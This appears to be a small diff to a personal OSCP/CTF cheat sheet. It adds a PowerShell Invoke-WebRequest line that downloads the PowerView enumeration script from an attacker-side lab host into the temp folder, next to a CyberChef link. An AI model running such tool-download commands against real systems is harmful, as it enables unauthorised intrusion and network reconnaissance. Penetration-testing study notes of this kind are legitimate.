@@ -2,6 +2,10 @@
 
 # OSCP / CTF
 
+```
+Invoke-WebRequest -Uri "http://10.10.14.61:8000/PowerView.ps1" -OutFile "$env:temp\PowerView.ps1"
+```
+
 CyberChef
 ```
 https://gchq.github.io/CyberChef/
